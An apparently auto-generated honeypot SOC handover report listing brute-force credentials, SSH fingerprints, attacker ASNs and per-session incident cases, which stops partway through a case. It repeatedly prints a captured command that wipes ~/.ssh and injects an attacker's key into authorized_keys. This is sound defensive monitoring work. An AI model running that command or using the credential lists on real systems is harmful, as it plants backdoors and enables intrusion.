# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-06 |
| **Generated At** | 2026-04-06T10:55:04Z |
| **Shift Time** | 10:55 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **103** |
| Confirmed Threats | **83** |
| False Positives Filtered | **20** (19.4%) |
| Unique Attacker IPs | **10** |
| Countries of Origin | **9** |
| High Severity Cases | **40** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **63** |
| Malware Samples Analyzed | **0** HIGH · **15** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **79** |
| Unique Credential Pairs | **41** |
| Unique Usernames | **18** |
| Unique Passwords | **41** |
| Successful Auth Pairs | **22** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 40 |
| `345gs5662d34` | 20 |
| `ubuntu` | 3 |
| `user` | 2 |
| `Unknown` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 20 |
| `3245gs5662d34` | 20 |
| `p@ssw0rd` | 1 |
| `webmaster` | 1 |
| `aA123456` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 20 |
| `root` | `3245gs5662d34` | 20 |
| `Unknown` | `p@ssw0rd` | 1 |
| `Test` | `webmaster` | 1 |
| `ubuntu` | `aA123456` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Admin111` | `35.210.61.208` | 2026-04-06T10:25:27 |
| `root` | `3245gs5662d34` | `35.210.61.208` | 2026-04-06T10:25:31 |
| `root` | `Aa12345678!` | `35.210.61.208` | 2026-04-06T10:28:26 |
| `root` | `Root31!` | `14.248.82.58` | 2026-04-06T10:29:27 |
| `root` | `3245gs5662d34` | `14.248.82.58` | 2026-04-06T10:29:30 |
| `root` | `@dmin2025` | `35.210.61.208` | 2026-04-06T10:29:54 |
| `root` | `qazwsx2024@` | `14.248.82.58` | 2026-04-06T10:31:15 |
| `root` | `Zp123456` | `35.210.61.208` | 2026-04-06T10:31:21 |
| `root` | `root12345..` | `35.210.61.208` | 2026-04-06T10:32:44 |
| `root` | `QWERTY1234!` | `14.248.82.58` | 2026-04-06T10:32:59 |
| `root` | `huang520` | `35.210.61.208` | 2026-04-06T10:35:33 |
| `root` | `zzDD1234` | `35.210.61.208` | 2026-04-06T10:37:00 |
| `root` | `Root2018@#` | `14.248.82.58` | 2026-04-06T10:38:10 |
| `root` | `alireza` | `35.210.61.208` | 2026-04-06T10:38:26 |
| `root` | `Qwer1234` | `35.210.61.208` | 2026-04-06T10:41:23 |
| `root` | `QWERTYUIOP123@` | `35.210.61.208` | 2026-04-06T10:42:54 |
| `root` | `1qaz@WSX3edc$RFV..` | `35.210.61.208` | 2026-04-06T10:44:20 |
| `root` | `xxQQ123` | `14.248.82.58` | 2026-04-06T10:44:28 |
| `root` | `123-asd` | `35.210.61.208` | 2026-04-06T10:45:43 |
| `root` | `Qwe444` | `35.210.61.208` | 2026-04-06T10:51:26 |
| `root` | `Test1234!` | `35.210.61.208` | 2026-04-06T10:52:50 |
| `root` | `1qaz2wsx$` | `14.248.82.58` | 2026-04-06T10:53:15 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **103** |
| Sessions with Fingerprint | **3** |
| Unique HASSH Fingerprints | **3** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 77 |
| OpenSSH | 2 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 77 | 2 |
| `acaa53e0a7d7...` | Mirai/variant | 2 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 77 | 2 | Modern SSH client |
| `acaa53e0a7d7...` | OpenSSH | 2 | 2 | Mirai/variant |
| `95420f9d932d...` | Unknown | 1 | 1 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 20 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `35.210.61.208`, `14.248.82.58`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **10** |
| Unique ASNs | **10** |
| High-Risk ASNs | **8** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4609` | Companhia de Telecomunicacoes de Macau SARL | 1 | HIGH |
| `AS9829` | National Internet Backbone | 1 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 1 | HIGH |
| `AS206264` | Amarutu Technology Ltd | 1 | HIGH |
| `AS15169` | Google LLC | 1 | HIGH |
| `AS8075` | Microsoft Corporation | 1 | LOW |
| `AS45899` | VNPT Corp | 1 | HIGH |
| `AS9506` | Singtel Fibre Broadband | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (40)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-80d96e22d146

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-04-06 10:25 |
| **Last Seen** | 2026-04-06 10:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 10:25:26` | `cowrie.session.connect` |
| `2026-04-06 10:25:26` | `cowrie.client.version` |
| `2026-04-06 10:25:26` | `cowrie.client.kex` |
| `2026-04-06 10:25:27` | `cowrie.login.success` |
| `2026-04-06 10:25:27` | `cowrie.session.params` |
| `2026-04-06 10:25:27` | `cowrie.command.input` |
| `2026-04-06 10:25:27` | `cowrie.command.failed` |
| `2026-04-06 10:25:27` | `cowrie.log.closed` |
| `2026-04-06 10:25:28` | `cowrie.session.params` |
| `2026-04-06 10:25:28` | `cowrie.command.input` |
| `2026-04-06 10:25:28` | `cowrie.session.file_download` |
| `2026-04-06 10:25:28` | `cowrie.log.closed` |
| `2026-04-06 10:25:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1499e7910339

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-04-06 10:25 |
| **Last Seen** | 2026-04-06 10:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 10:25:30` | `cowrie.session.connect` |
| `2026-04-06 10:25:30` | `cowrie.client.version` |
| `2026-04-06 10:25:30` | `cowrie.client.kex` |
| `2026-04-06 10:25:31` | `cowrie.login.success` |
| `2026-04-06 10:25:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60deacbd15a5

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-04-06 10:28 |
| **Last Seen** | 2026-04-06 10:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 10:28:25` | `cowrie.session.connect` |
| `2026-04-06 10:28:25` | `cowrie.client.version` |
| `2026-04-06 10:28:25` | `cowrie.client.kex` |
| `2026-04-06 10:28:26` | `cowrie.login.success` |
| `2026-04-06 10:28:26` | `cowrie.session.params` |
| `2026-04-06 10:28:26` | `cowrie.command.input` |
| `2026-04-06 10:28:26` | `cowrie.command.failed` |
| `2026-04-06 10:28:26` | `cowrie.log.closed` |
| `2026-04-06 10:28:27` | `cowrie.session.params` |
| `2026-04-06 10:28:27` | `cowrie.command.input` |
| `2026-04-06 10:28:27` | `cowrie.session.file_download` |
| `2026-04-06 10:28:27` | `cowrie.log.closed` |
| `2026-04-06 10:28:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-152dbb043876

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-04-06 10:28 |
| **Last Seen** | 2026-04-06 10:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 10:28:29` | `cowrie.session.connect` |
| `2026-04-06 10:28:29` | `cowrie.client.version` |
| `2026-04-06 10:28:29` | `cowrie.client.kex` |
| `2026-04-06 10:28:30` | `cowrie.login.success` |
| `2026-04-06 10:28:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc8f69873988

| Field | Detail |
|---|---|
| **Source IP** | `14.248.82[.]58` |
| **First Seen** | 2026-04-06 10:29 |
| **Last Seen** | 2026-04-06 10:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 10:29:26` | `cowrie.session.connect` |
| `2026-04-06 10:29:26` | `cowrie.client.version` |
| `2026-04-06 10:29:26` | `cowrie.client.kex` |
| `2026-04-06 10:29:27` | `cowrie.login.success` |
| `2026-04-06 10:29:27` | `cowrie.session.params` |
| `2026-04-06 10:29:27` | `cowrie.command.input` |
| `2026-04-06 10:29:27` | `cowrie.command.failed` |
| `2026-04-06 10:29:27` | `cowrie.log.closed` |
| `2026-04-06 10:29:27` | `cowrie.session.params` |
| `2026-04-06 10:29:27` | `cowrie.command.input` |
| `2026-04-06 10:29:27` | `cowrie.session.file_download` |
| `2026-04-06 10:29:27` | `cowrie.log.closed` |
| `2026-04-06 10:29:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.82[.]58` to AbuseIPDB if not already reported
- [ ] Block `14.248.82[.]58` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f77f50f8b86

| Field | Detail |
|---|---|
| **Source IP** | `14.248.82[.]58` |
| **First Seen** | 2026-04-06 10:29 |
| **Last Seen** | 2026-04-06 10:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 10:29:29` | `cowrie.session.connect` |
| `2026-04-06 10:29:29` | `cowrie.client.version` |
| `2026-04-06 10:29:29` | `cowrie.client.kex` |
| `2026-04-06 10:29:30` | `cowrie.login.success` |
| `2026-04-06 10:29:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.82[.]58` to AbuseIPDB if not already reported
- [ ] Block `14.248.82[.]58` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f72e12eb4997

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-04-06 10:29 |
| **Last Seen** | 2026-04-06 10:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 10:29:53` | `cowrie.session.connect` |
| `2026-04-06 10:29:53` | `cowrie.client.version` |
| `2026-04-06 10:29:53` | `cowrie.client.kex` |
| `2026-04-06 10:29:54` | `cowrie.login.success` |
| `2026-04-06 10:29:54` | `cowrie.session.params` |
| `2026-04-06 10:29:54` | `cowrie.command.input` |
| `2026-04-06 10:29:54` | `cowrie.command.failed` |
| `2026-04-06 10:29:54` | `cowrie.log.closed` |
| `2026-04-06 10:29:54` | `cowrie.session.params` |
| `2026-04-06 10:29:54` | `cowrie.command.input` |
| `2026-04-06 10:29:54` | `cowrie.session.file_download` |
| `2026-04-06 10:29:54` | `cowrie.log.closed` |
| `2026-04-06 10:29:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70152e7a1111

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-04-06 10:29 |
| **Last Seen** | 2026-04-06 10:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 10:29:57` | `cowrie.session.connect` |
| `2026-04-06 10:29:57` | `cowrie.client.version` |
| `2026-04-06 10:29:57` | `cowrie.client.kex` |
| `2026-04-06 10:29:57` | `cowrie.login.success` |
| `2026-04-06 10:29:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41962c9fec9f

| Field | Detail |
|---|---|
| **Source IP** | `14.248.82[.]58` |
| **First Seen** | 2026-04-06 10:31 |
| **Last Seen** | 2026-04-06 10:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 10:31:14` | `cowrie.session.connect` |
| `2026-04-06 10:31:14` | `cowrie.client.version` |
| `2026-04-06 10:31:14` | `cowrie.client.kex` |
| `2026-04-06 10:31:15` | `cowrie.login.success` |
| `2026-04-06 10:31:15` | `cowrie.session.params` |
| `2026-04-06 10:31:15` | `cowrie.command.input` |
| `2026-04-06 10:31:15` | `cowrie.command.failed` |
| `2026-04-06 10:31:15` | `cowrie.log.closed` |
| `2026-04-06 10:31:15` | `cowrie.session.params` |
| `2026-04-06 10:31:15` | `cowrie.command.input` |
| `2026-04-06 10:31:16` | `cowrie.session.file_download` |
| `2026-04-06 10:31:16` | `cowrie.log.closed` |
| `2026-04-06 10:31:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.82[.]58` to AbuseIPDB if not already reported
- [ ] Block `14.248.82[.]58` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a68d2ba818a

| Field | Detail |
|---|---|
| **Source IP** | `14.248.82[.]58` |
| **First Seen** | 2026-04-06 10:31 |
| **Last Seen** | 2026-04-06 10:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 10:31:17` | `cowrie.session.connect` |
| `2026-04-06 10:31:17` | `cowrie.client.version` |
| `2026-04-06 10:31:18` | `cowrie.client.kex` |
| `2026-04-06 10:31:18` | `cowrie.login.success` |
| `2026-04-06 10:31:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.82[.]58` to AbuseIPDB if not already reported
- [ ] Block `14.248.82[.]58` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-778ab5432962

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-04-06 10:31 |
| **Last Seen** | 2026-04-06 10:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 10:31:20` | `cowrie.session.connect` |
| `2026-04-06 10:31:20` | `cowrie.client.version` |
| `2026-04-06 10:31:20` | `cowrie.client.kex` |
| `2026-04-06 10:31:21` | `cowrie.login.success` |
| `2026-04-06 10:31:21` | `cowrie.session.params` |
| `2026-04-06 10:31:21` | `cowrie.command.input` |
| `2026-04-06 10:31:21` | `cowrie.command.failed` |
| `2026-04-06 10:31:21` | `cowrie.log.closed` |
| `2026-04-06 10:31:21` | `cowrie.session.params` |
| `2026-04-06 10:31:21` | `cowrie.command.input` |
| `2026-04-06 10:31:22` | `cowrie.session.file_download` |
| `2026-04-06 10:31:22` | `cowrie.log.closed` |
| `2026-04-06 10:31:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9712aef602a

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-04-06 10:31 |
| **Last Seen** | 2026-04-06 10:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 10:31:24` | `cowrie.session.connect` |
| `2026-04-06 10:31:24` | `cowrie.client.version` |
| `2026-04-06 10:31:24` | `cowrie.client.kex` |
| `2026-04-06 10:31:24` | `cowrie.login.success` |
| `2026-04-06 10:31:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7703bb80323

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-04-06 10:32 |
| **Last Seen** | 2026-04-06 10:32 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 10:32:43` | `cowrie.session.connect` |
| `2026-04-06 10:32:43` | `cowrie.client.version` |
| `2026-04-06 10:32:43` | `cowrie.client.kex` |
| `2026-04-06 10:32:44` | `cowrie.login.success` |
| `2026-04-06 10:32:44` | `cowrie.session.params` |
| `2026-04-06 10:32:44` | `cowrie.command.input` |
